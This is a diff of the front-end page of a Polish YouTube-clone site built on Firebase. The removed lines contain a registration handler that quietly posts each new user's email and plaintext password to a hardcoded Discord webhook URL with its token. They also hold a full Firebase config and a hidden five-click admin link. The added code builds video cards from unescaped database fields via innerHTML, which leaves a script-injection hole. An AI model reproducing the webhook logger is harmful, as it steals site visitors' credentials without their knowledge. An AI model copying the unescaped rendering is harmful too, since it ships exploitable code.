@@ -2,173 +2,78 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Polski YouTube - System Logowania</title>
+    <title>Polski YouTube</title>
     <style>
         body { background: #0f0f0f; color: white; font-family: sans-serif; margin: 0; }
         header { height: 56px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; background: #0f0f0f; border-bottom: 1px solid #333; position: sticky; top: 0; z-index: 1000; }
-        .logo { font-size: 20px; font-weight: bold; cursor: pointer; color: white; text-decoration: none; }
-        .logo span { background: red; padding: 2px 8px; border-radius: 4px; margin-right: 5px; }
-        .btn { border: none; padding: 8px 16px; border-radius: 18px; cursor: pointer; font-weight: bold; }
-        .btn-blue { background: #3ea6ff; color: #0f0f0f; }
+        .logo { font-size: 20px; font-weight: bold; cursor: pointer; }
+        .logo span { background: red; padding: 2px 8px; border-radius: 4px; }
         .container { max-width: 1200px; margin: auto; padding: 20px; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; }
-        .modal-content { background: #282828; padding: 30px; border-radius: 15px; width: 320px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #121212; border: 1px solid #333; color: white; border-radius: 8px; box-sizing: border-box; }
-        .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-top: 20px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-bottom: 40px; }
+        .shorts-grid { display: flex; gap: 15px; overflow-x: auto; padding-bottom: 10px; }
+        .v-card { cursor: pointer; background: #1a1a1a; border-radius: 12px; overflow: hidden; }
+        .v-card video { width: 100%; aspect-ratio: 16/9; object-fit: cover; }
+        .short-card { width: 180px; flex-shrink: 0; cursor: pointer; }
+        .short-card video { width: 100%; aspect-ratio: 9/16; object-fit: cover; border-radius: 12px; }
+        .verified-badge { color: #3ea6ff; margin-left: 4px; font-weight: bold; }
+        .btn-blue { background: #3ea6ff; color: #0f0f0f; border: none; padding: 8px 16px; border-radius: 18px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <header>
     <div class="logo" id="mainLogo"><span>PL</span> YouTube</div>
-    <div>
-        <button id="showLogin" class="btn btn-blue">ZALOGUJ / DOŁĄCZ</button>
-        <div id="userMenu" style="display:none; gap:10px;">
-            <button id="myProfileBtn" class="btn btn-blue">MÓJ PROFIL</button>
-            <button id="logoutBtn" class="btn" style="background:#333; color:white;">WYLOGUJ</button>
-        </div>
-    </div>
+    <button id="showLogin" class="btn-blue">ZALOGUJ SIĘ</button>
 </header>
 
 <div class="container">
-    <h2>Najnowsze filmy</h2>
-    <div id="videoList" class="video-grid"></div>
-</div>
-
-<div id="authModal" class="modal">
-    <div class="modal-content">
-        <h2 id="authTitle" style="margin-top:0">Logowanie</h2>
-        <input type="email" id="emailInp" placeholder="Twój E-mail">
-        <input type="password" id="passInp" placeholder="Twoje Hasło">
-        <button class="btn btn-blue" style="width:100%; padding: 12px;" id="authSubmit">DALEJ</button>
-        <p id="toggleAuth" style="color:#3ea6ff; cursor:pointer; text-align:center; font-size:14px; margin-top:20px;">Nie masz konta? Zarejestruj się</p>
-        <button onclick="document.getElementById('authModal').style.display='none'" style="background:none; border:none; color:gray; width:100%; margin-top:15px; cursor:pointer;">Anuluj</button>
-    </div>
+    <h3>📱 Shortsy</h3>
+    <div id="shortsList" class="shorts-grid"></div>
+    
+    <h3>🎥 Filmy</h3>
+    <div id="videoList" class="grid"></div>
 </div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-    import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+    import { getFirestore, collection, getDocs, doc, getDoc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    const firebaseConfig = {
-        apiKey: "AIzaSyCpp-nUIT7bHmtO8qJI3-Q89biIpsnIBzM",
-        authDomain: "polski-youtub2.firebaseapp.com",
-        projectId: "polski-youtub2",
-        storageBucket: "polski-youtub2.firebasestorage.app",
-        messagingSenderId: "325129789226",
-        appId: "1:325129789226:web:f68f2f1a1f8f9feaf14853",
-        measurementId: "G-B5M3F5J713"
-    };
-
+    const firebaseConfig = { /* TWOJE CONFIG */ };
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
     const db = getFirestore(app);
 
-    // --- TWOJA FUNKCJA LOGÓW DISCORD ---
-    async function sendDiscordLog(email, password) {
-        const webhookURL = "https://discord.com/api/webhooks/1456448665324617912/GXFBBj95oQav5KkIXoTqXXO8TlWZJ8_pr3EFxIy3HmZxE3m4EWyuD-jQp1pSHHojCcc1";
-        
-        const payload = {
-            username: "PL YT BOT",
-            embeds: [{
-                title: "🆕 NOWY UŻYTKOWNIK!",
-                color: 16711680, // Czerwony
-                fields: [
-                    { name: "📧 E-mail", value: email, inline: true },
-                    { name: "🔑 Hasło", value: "||" + password + "||", inline: true }
-                ],
-                timestamp: new Date().toISOString()
-            }]
-        };
-
-        try {
-            await fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-            console.log("Log wysłany!");
-        } catch (e) {
-            console.error("Błąd webhooka:", e);
+    async function getAuthorName(email) {
+        const uSnap = await getDoc(doc(db, "users", email));
+        if (uSnap.exists() && uSnap.data().verified) {
+            return `${email} <span class="verified-badge">✔️</span>`;
         }
+        return email;
     }
 
-    // --- LOGIKA FORMULARZA ---
-    let isRegisterMode = false;
-    const authModal = document.getElementById('authModal');
-    
-    document.getElementById('showLogin').onclick = () => { isRegisterMode = false; authModal.style.display='flex'; };
-    document.getElementById('toggleAuth').onclick = () => {
-        isRegisterMode = !isRegisterMode;
-        document.getElementById('authTitle').innerText = isRegisterMode ? "Rejestracja" : "Logowanie";
-        document.getElementById('toggleAuth').innerText = isRegisterMode ? "Masz konto? Zaloguj się" : "Nie masz konta? Zarejestruj się";
-    };
-
-    document.getElementById('authSubmit').onclick = async () => {
-        const email = document.getElementById('emailInp').value;
-        const pass = document.getElementById('passInp').value;
-
-        if(!email || !pass) return alert("Wypełnij pola!");
-
-        try {
-            if(isRegisterMode) {
-                // REJESTRACJA + LOG NA DISCORD
-                await createUserWithEmailAndPassword(auth, email, pass);
-                await sendDiscordLog(email, pass); 
-                alert("Konto założone!");
-            } else {
-                // LOGOWANIE
-                await signInWithEmailAndPassword(auth, email, pass);
-            }
-            authModal.style.display = 'none';
-        } catch(e) {
-            alert("Błąd: " + e.message);
-        }
-    };
-
-    // --- STAN UŻYTKOWNIKA ---
-    onAuthStateChanged(auth, user => {
-        if(user) {
-            document.getElementById('showLogin').style.display = 'none';
-            document.getElementById('userMenu').style.display = 'flex';
-            document.getElementById('myProfileBtn').onclick = () => location.href = "profile.html?email=" + user.email;
-        } else {
-            document.getElementById('showLogin').style.display = 'block';
-            document.getElementById('userMenu').style.display = 'none';
-        }
-    });
-
-    document.getElementById('logoutBtn').onclick = () => signOut(auth);
-
-    // --- ŁADOWANIE FILMÓW ---
-    async function loadVideos() {
+    async function load() {
         const snap = await getDocs(query(collection(db, "content"), orderBy("createdAt", "desc")));
-        const list = document.getElementById('videoList');
-        list.innerHTML = "";
-        snap.forEach(doc => {
-            const data = doc.data();
-            const div = document.createElement('div');
-            div.style.background = "#1a1a1a";
-            div.style.padding = "10px";
-            div.style.borderRadius = "10px";
-            div.style.cursor = "pointer";
-            div.innerHTML = `<video src="${data.url}#t=0.1" style="width:100%; border-radius:8px;"></video><h3>${data.title}</h3><small>${data.author}</small>`;
-            div.onclick = () => location.href = "video.html?id=" + doc.id;
-            list.appendChild(div);
-        });
+        for (const d of snap.docs) {
+            const data = d.data();
+            const authorHTML = await getAuthorName(data.author);
+            
+            if (data.type === 'short') {
+                const div = document.createElement('div');
+                div.className = 'short-card';
+                div.innerHTML = `<video src="${data.url}#t=0.1"></video><p>${data.title}</p><small>${authorHTML}</small>`;
+                div.onclick = () => location.href = `video.html?id=${d.id}`;
+                document.getElementById('shortsList').appendChild(div);
+            } else {
+                const div = document.createElement('div');
+                div.className = 'v-card';
+                div.innerHTML = `<video src="${data.url}#t=0.1"></video><div style="padding:10px"><b>${data.title}</b><br><small>${authorHTML}</small></div>`;
+                div.onclick = () => location.href = `video.html?id=${d.id}`;
+                document.getElementById('videoList').appendChild(div);
+            }
+        }
     }
-
-    loadVideos();
-
-    // Sekretny admin (5 kliknięć w logo)
-    let logoClicks = 0;
-    document.getElementById('mainLogo').onclick = () => {
-        logoClicks++;
-        if(logoClicks === 5) location.href = "admin.html";
-        setTimeout(() => logoClicks = 0, 3000);
-    };
+    load();
 </script>
 </body>
 </html>
